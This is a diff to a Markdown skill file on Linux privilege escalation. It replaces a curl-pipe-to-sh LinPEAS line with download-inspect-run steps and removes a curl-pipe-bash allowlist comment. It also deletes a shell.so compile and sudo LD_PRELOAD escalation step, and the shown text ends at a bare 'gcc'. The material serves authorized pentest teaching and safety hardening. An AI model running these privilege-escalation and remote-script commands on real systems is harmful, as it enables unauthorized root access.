@@ -10,8 +10,6 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linu
 
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
-<!-- security-allowlist: curl-pipe-bash -->
-
 # Linux Privilege Escalation
 
 ## Purpose
@@ -146,8 +144,11 @@ echo $PATH
 Deploy automated scripts for comprehensive enumeration:
 
 ```bash
-# LinPEAS
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# LinPEAS: download first, inspect the script, then execute only in an authorized lab
+curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+less linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
 
 # LinEnum
 ./LinEnum.sh -t
@@ -259,7 +260,4 @@ void _init() {
 
 ```bash
 # Compile shared library
-gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-
-# Execute with sudo
-sudo LD_PRELOAD=/tm
+gcc
